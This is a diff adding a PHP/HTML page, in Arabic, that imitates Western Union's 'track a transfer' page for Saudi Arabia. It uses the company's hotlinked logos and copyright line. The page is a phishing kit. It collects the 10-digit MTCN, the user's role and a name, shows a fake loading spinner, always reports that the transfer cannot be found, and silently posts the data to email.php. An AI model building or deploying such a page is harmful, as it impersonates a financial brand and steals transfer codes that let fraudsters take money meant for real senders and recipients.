@@ -1,0 +1,696 @@
+<?php // index.php ?>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>تتبّع التحويل مع Western Union</title>
+  <style>
+    /* Global Styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+    
+    body {
+      background-color: #f5f5f2;
+      color: #333;
+      direction: rtl;
+    }
+    
+    /* Header Styles */
+    header {
+      background-color: #2c2e35;
+      padding: 15px 0;
+      border-bottom: 1px solid #333;
+    }
+    
+    .container {
+      width: 95%;
+      max-width: 1200px;
+      margin: 0 auto;
+      position: relative;
+    }
+    
+    .header-container {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    
+    .logo {
+      width: 180px;
+      height: 35px;
+    }
+    
+    .logo img {
+      height: 100%;
+    }
+    
+    .nav-menu {
+      display: flex;
+      align-items: center;
+    }
+    
+    .nav-link {
+      color: white;
+      margin-left: 20px;
+      text-decoration: none;
+      font-size: 14px;
+    }
+    
+    .login-btn {
+      background-color: transparent;
+      border: 1px solid white;
+      color: white;
+      padding: 8px 15px;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-right: 10px;
+      font-size: 14px;
+    }
+    
+    .hamburger {
+      background: none;
+      border: none;
+      color: white;
+      font-size: 24px;
+      cursor: pointer;
+      display: none;
+    }
+    
+    @media (max-width: 768px) {
+      .nav-menu .nav-link {
+        display: none;
+      }
+      .hamburger {
+        display: block;
+      }
+    }
+    
+    /* Main Content Styles */
+    .main-content {
+      padding: 30px 0;
+    }
+    
+    .page-title {
+      text-align: center;
+      margin-bottom: 20px;
+      font-size: 24px;
+      color: #333;
+    }
+    
+    .country-indicator {
+      text-align: left;
+      margin-bottom: 20px;
+      color: #666;
+      font-size: 14px;
+    }
+    
+    /* Tabs Styles */
+    .tabs-container {
+      background-color: white;
+      border-radius: 6px;
+      overflow: hidden;
+      max-width: 800px;
+      margin: 0 auto;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+    }
+    
+    .tabs {
+      display: flex;
+      border-bottom: 1px solid #eee;
+    }
+    
+    .tab {
+      flex: 1;
+      text-align: center;
+      padding: 15px 0;
+      cursor: pointer;
+      position: relative;
+      font-weight: bold;
+      transition: all 0.3s;
+    }
+    
+    .tab.active-tab {
+      color: #0070ba;
+      border-bottom: 3px solid #0070ba;
+    }
+    
+    .tab .icon {
+      margin-left: 10px;
+      font-size: 18px;
+    }
+    
+    /* Form Styles */
+    .form-container {
+      padding: 30px;
+      display: none;
+    }
+    
+    .form-container.active {
+      display: block;
+    }
+    
+    .input-container {
+      margin-bottom: 20px;
+    }
+    
+    .input-field {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 16px;
+      text-align: center;
+    }
+    
+    .mtcn-input-container {
+      position: relative;
+    }
+    
+    .error {
+      color: #d50000;
+      text-align: center;
+      margin-top: 5px;
+    }
+    
+    button[type="submit"] {
+      width: 100%;
+      background-color: #6383bc;
+      color: white;
+      border: none;
+      padding: 15px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+    
+    button[type="submit"]:hover {
+      background-color: #4f6fa3;
+    }
+    
+    .mtcn-info {
+      text-align: center;
+      margin-top: 20px;
+      color: #666;
+      font-size: 13px;
+    }
+    
+    .mtcn-info a {
+      color: #0070ba;
+      text-decoration: none;
+    }
+    
+    /* Footer Styles */
+    footer {
+      background-color: white;
+      padding: 20px 0;
+      margin-top: 50px;
+      border-top: 1px solid #eee;
+      font-size: 12px;
+    }
+    
+    .footer-links {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      margin-bottom: 15px;
+    }
+    
+    .footer-link {
+      margin: 0 10px;
+      color: #666;
+      text-decoration: none;
+    }
+    
+    .copyright {
+      text-align: center;
+      color: #666;
+      margin-top: 15px;
+    }
+    
+    .social-icons {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+    }
+    
+    .social-icon {
+      width: 30px;
+      height: 30px;
+      background-color: #f5f5f5;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 5px;
+      color: #333;
+      text-decoration: none;
+    }
+    
+    /* مدخل اختياري للاسم */
+    .name-input {
+      margin-bottom: 15px;
+    }
+    
+    /* MTCN Styles - Tracking Number Input */
+    .mtcn-display {
+      display: flex;
+      justify-content: center;
+      margin: 20px 0;
+    }
+    
+    .digit-container {
+      display: inline-block;
+      text-align: center;
+      margin: 0 2px;
+      cursor: text;
+      position: relative;
+    }
+    
+    .digit-line {
+      width: 30px;
+      height: 2px;
+      background-color: #ccc;
+      margin: 0 auto;
+    }
+    
+    .digit-container.active .digit-line {
+      background-color: #6383bc;
+      height: 3px;
+    }
+    
+    .digit {
+      font-size: 24px;
+      margin-bottom: 5px;
+      color: #333;
+      min-height: 30px;
+      min-width: 20px;
+    }
+    
+    /* Add separator styles */
+    .digit-container.separator {
+      margin-right: 15px;
+    }
+    
+    /* Loading Overlay */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background-color: rgba(255, 255, 255, 0.8);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .loading-spinner {
+      width: 80px;
+      height: 80px;
+      position: relative;
+    }
+    
+    .loading-logo {
+      position: absolute;
+      width: 50px;
+      height: 50px;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+    }
+    
+    .loading-circle {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 4px solid transparent;
+      border-top-color: #ffcc00;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    /* Error message */
+    .error-message {
+      color: #d50000;
+      text-align: center;
+      margin: 10px 0;
+      font-size: 14px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Header -->
+  <header>
+    <div class="container header-container">
+      <div class="logo">
+        <img src="https://www.westernunion.com/content/dam/wu/logo/logo.svg" alt="Western Union">
+      </div>
+      <div class="nav-menu">
+        <a href="#" class="nav-link">تتبع التحويل</a>
+        <a href="#" class="nav-link">إرسال الأموال</a>
+        <a href="#" class="nav-link">كيفية إرسال الأموال</a>
+        <button class="login-btn">تسجيل الدخول</button>
+        <button class="hamburger">☰</button>
+      </div>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main class="main-content">
+    <div class="container">
+      <h1 class="page-title">تتبّع تحويل</h1>
+      <div class="country-indicator">عربي | المملكة العربية السعودية</div>
+      
+      <div class="tabs-container">
+        <div class="tabs">
+          <div class="tab active-tab" onclick="showForm('sender')">
+            <span class="icon">↑</span> أنا المُرسِل
+          </div>
+          <div class="tab" onclick="showForm('receiver')">
+            <span class="icon">↓</span> أنا المستلم
+          </div>
+        </div>
+        
+        <!-- Sender Form -->
+        <div id="senderForm" class="form-container active">
+          <form action="javascript:void(0);" onsubmit="submitForm('sender', 'senderMTCN', 'errorSender')">
+            <input type="hidden" name="role" value="sender">
+            <span _ngcontent-serverapp-c240421037="" class="message" style="padding:10px;    color: red;
+            padding-right: 225px;">track-transfer.mtcn_text_input_error_new</span>
+            
+            <div class="input-container mtcn-input-container">
+              <!-- Hidden input to store the actual value -->
+              <input type="hidden" id="senderMTCN" name="mtcn" maxlength="10">
+              <div id="errorSender" class="error" style="display: none;">رقم التتبع يجب أن يكون 10 أرقام</div>
+            </div>
+            
+            <div id="senderDigitDisplay" class="mtcn-display">
+              <!-- Interactive digits will be inserted here -->
+            </div>
+            
+            <div id="senderErrorMessage" class="error-message" style="display: none;">
+              We can't find that transfer. Please check and re-enter the information below.
+            </div>
+            
+            <button type="submit">المتابعة</button>
+            
+            <p class="mtcn-info">لا تعرف رقم التتبع (MTCN)؟ <a href="#">اعرف المزيد</a></p>
+          </form>
+        </div>
+        
+        <!-- Receiver Form -->
+        <div id="receiverForm" class="form-container">
+          <form action="javascript:void(0);" onsubmit="submitForm('receiver', 'receiverMTCN', 'errorReceiver')">
+            <input type="hidden" name="role" value="receiver">
+            <span _ngcontent-serverapp-c240421037="" class="message" style="padding:10px;    color: red;
+            padding-right: 225px;">track-transfer.mtcn_text_input_error_new</span>
+            
+            <div class="input-container name-input">
+              <input type="hidden" name="name" class="input-field" placeholder="track-transfer.mtcn_text_input_error_new" />
+            </div>
+            
+            <div class="input-container mtcn-input-container">
+              <!-- Hidden input to store the actual value -->
+              <input type="hidden" id="receiverMTCN" name="mtcn" maxlength="10">
+              <div id="errorReceiver" class="error" style="display: none;">رقم التتبع يجب أن يكون 10 أرقام</div>
+            </div>
+            
+            <div id="receiverDigitDisplay" class="mtcn-display">
+              <!-- Interactive digits will be inserted here -->
+            </div>
+            
+            <div id="receiverErrorMessage" class="error-message" style="display: none;">
+              We can't find that transfer. Please check and re-enter the information below.
+            </div>
+            
+            <button type="submit">المتابعة</button>
+            
+            <p class="mtcn-info">لا تعرف رقم التتبع (MTCN)؟ <a href="#">اعرف المزيد</a></p>
+          </form>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- Loading Overlay -->
+  <div id="loadingOverlay" class="loading-overlay">
+    <div class="loading-spinner">
+      <div class="loading-circle"></div>
+      <img src="https://www.westernunion.com/content/dam/wu/logo/logos-for-reuse/wu-symbol.svg" alt="WU" class="loading-logo">
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <div class="container">
+      <div class="footer-links">
+        <a href="#" class="footer-link">الشروط والأحكام</a>
+        <a href="#" class="footer-link">إخلاء المسؤولية من الاحتيال</a>
+        <a href="#" class="footer-link">بيان الخصوصية عبر شبكة الإنترنت</a>
+        <a href="#" class="footer-link">قاعدة الخصوصية</a>
+        <a href="#" class="footer-link">مؤسسة WU</a>
+        <a href="#" class="footer-link">الوظائف</a>
+        <a href="#" class="footer-link">العملاء من المستثمرين</a>
+        <a href="#" class="footer-link">ابلاغ عن حالات الأمن</a>
+        <a href="#" class="footer-link">الضريبة</a>
+        <a href="#" class="footer-link">بلغنا عما نقوم به</a>
+        <a href="#" class="footer-link">معلومات حول الشركة</a>
+        <a href="#" class="footer-link">الصفحة الرئيسية</a>
+      </div>
+      
+      <div class="social-icons">
+        <a href="#" class="social-icon">f</a>
+        <a href="#" class="social-icon">Y</a>
+        <a href="#" class="social-icon">I</a>
+        <a href="#" class="social-icon">X</a>
+      </div>
+      
+      <p class="copyright">حقوق الطبع والنشر © Western Union Holdings, Inc 2025 جميع الحقوق محفوظة</p>
+    </div>
+  </footer>
+
+  <script>
+    // وظائف بسيطة لتبديل التبويبات والتحقق من المدخل
+    function showForm(formType) {
+      // Reset error messages
+      document.getElementById('senderErrorMessage').style.display = 'none';
+      document.getElementById('receiverErrorMessage').style.display = 'none';
+      
+      document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active-tab'));
+      document.querySelectorAll('.form-container').forEach(fc => fc.classList.remove('active'));
+      
+      if (formType === 'sender') {
+        document.getElementById('senderForm').classList.add('active');
+        document.querySelectorAll('.tab')[0].classList.add('active-tab');
+      } else {
+        document.getElementById('receiverForm').classList.add('active');
+        document.querySelectorAll('.tab')[1].classList.add('active-tab');
+      }
+    }
+    
+    // Function to create the interactive digit display
+    function createInteractiveDigitDisplay(displayId, inputId) {
+      const display = document.getElementById(displayId);
+      const hiddenInput = document.getElementById(inputId);
+      
+      // Clear previous display
+      display.innerHTML = '';
+      
+      // Array to store the digits
+      let digits = Array(10).fill('');
+      
+      // Create display with 10 interactive digits
+      for (let i = 0; i < 10; i++) {
+        const digitContainer = document.createElement('div');
+        digitContainer.className = 'digit-container';
+        digitContainer.setAttribute('data-index', i);
+        
+        // Add separators after 3rd and 7th positions
+        if (i === 3 || i === 7) {
+          digitContainer.classList.add('separator');
+        }
+        
+        const digitSpan = document.createElement('div');
+        digitSpan.className = 'digit';
+        digitSpan.textContent = '';
+        
+        const digitLine = document.createElement('div');
+        digitLine.className = 'digit-line';
+        
+        digitContainer.appendChild(digitSpan);
+        digitContainer.appendChild(digitLine);
+        display.appendChild(digitContainer);
+        
+        // Make each digit container clickable
+        digitContainer.addEventListener('click', function() {
+          setActiveDigit(display, parseInt(this.getAttribute('data-index')));
+        });
+      }
+      
+      // Set first digit as active
+      setActiveDigit(display, 0);
+    }
+    
+    // Function to set the active digit
+    function setActiveDigit(display, index) {
+      // Remove active class from all digits
+      display.querySelectorAll('.digit-container').forEach(container => {
+        container.classList.remove('active');
+      });
+      
+      // Add active class to the specified digit
+      display.querySelectorAll('.digit-container')[index].classList.add('active');
+    }
+    
+    // Add global keyboard handler
+    document.addEventListener('keydown', function(e) {
+      // Find active form container
+      const activeForm = document.querySelector('.form-container.active');
+      if (!activeForm) return;
+      
+      // Get the digit display and hidden input for the active form
+      const displayId = activeForm.id === 'senderForm' ? 'senderDigitDisplay' : 'receiverDigitDisplay';
+      const inputId = activeForm.id === 'senderForm' ? 'senderMTCN' : 'receiverMTCN';
+      
+      const display = document.getElementById(displayId);
+      const hiddenInput = document.getElementById(inputId);
+      
+      // Get the active digit index
+      const activeDigitContainer = display.querySelector('.digit-container.active');
+      if (!activeDigitContainer) return;
+      
+      const activeIndex = parseInt(activeDigitContainer.getAttribute('data-index'));
+      
+      // Get current digits
+      let digits = Array(10).fill('');
+      display.querySelectorAll('.digit-container').forEach((container, index) => {
+        digits[index] = container.querySelector('.digit').textContent;
+      });
+      
+      // Handle numeric input
+      if (/^[0-9]$/.test(e.key)) {
+        digits[activeIndex] = e.key;
+        display.querySelectorAll('.digit-container')[activeIndex].querySelector('.digit').textContent = e.key;
+        
+        // Move to next digit
+        if (activeIndex < 9) {
+          setActiveDigit(display, activeIndex + 1);
+        }
+        
+        // Update hidden input
+        hiddenInput.value = digits.join('');
+        
+        e.preventDefault();
+      }
+      // Handle backspace
+      else if (e.key === 'Backspace') {
+        digits[activeIndex] = '';
+        display.querySelectorAll('.digit-container')[activeIndex].querySelector('.digit').textContent = '';
+        
+        // Move to previous digit if not at the beginning
+        if (activeIndex > 0) {
+          setActiveDigit(display, activeIndex - 1);
+        }
+        
+        // Update hidden input
+        hiddenInput.value = digits.join('');
+        
+        e.preventDefault();
+      }
+      // Handle arrow keys
+      else if (e.key === 'ArrowLeft') {
+        if (activeIndex > 0) {
+          setActiveDigit(display, activeIndex - 1);
+        }
+        e.preventDefault();
+      }
+      else if (e.key === 'ArrowRight') {
+        if (activeIndex < 9) {
+          setActiveDigit(display, activeIndex + 1);
+        }
+        e.preventDefault();
+      }
+    });
+    
+    // Modified validation function
+    function validateMTCN(inputId, errorId) {
+      var mtcnValue = document.getElementById(inputId).value.trim();
+      if (!/^\d{10}$/.test(mtcnValue)) {
+        document.getElementById(errorId).style.display = 'block';
+        return false;
+      }
+      document.getElementById(errorId).style.display = 'none';
+      return true;
+    }
+    
+    // Submit form function
+    function submitForm(formType, inputId, errorId) {
+      console.log("تم تقديم النموذج:", formType, inputId, errorId);
+      
+      // Validate the tracking number
+      if (!validateMTCN(inputId, errorId)) {
+        return false;
+      }
+      
+      // Get form data
+      let formData = new FormData();
+      let form = document.querySelector(`#${formType}Form form`);
+      let mtcn = document.getElementById(inputId).value;
+      
+      // Add name field for receiver form
+      if (formType === 'receiver') {
+        let name = form.querySelector('input[name="name"]').value;
+        formData.append('name', name);
+      }
+      
+      formData.append('role', formType);
+      formData.append('mtcn', mtcn);
+      
+      // Show loading overlay
+      document.getElementById('loadingOverlay').style.display = 'flex';
+      
+      // Simulate submission with a short delay
+      setTimeout(() => {
+        // Hide loading overlay
+        document.getElementById('loadingOverlay').style.display = 'none';
+        
+        // Show error message after submission (always as requested)
+        const errorMessageId = formType === 'sender' ? 'senderErrorMessage' : 'receiverErrorMessage';
+        document.getElementById(errorMessageId).style.display = 'block';
+        
+        // Send data via AJAX
+        try {
+          fetch('email.php', {
+            method: 'POST',
+            body: formData
+          })
+          .catch(error => {
+            console.error('Error:', error);
+          });
+        } catch (error) {
+          console.error('Error sending data:', error);
+        }
+      }, 2000); // 2-second delay to simulate loading
+    }
+    
+    // Initialize the interactive digit displays when the page loads
+    document.addEventListener('DOMContentLoaded', function() {
+      createInteractiveDigitDisplay('senderDigitDisplay', 'senderMTCN');
+      createInteractiveDigitDisplay('receiverDigitDisplay', 'receiverMTCN');
+    });
+  </script>
+</body>
+</html>
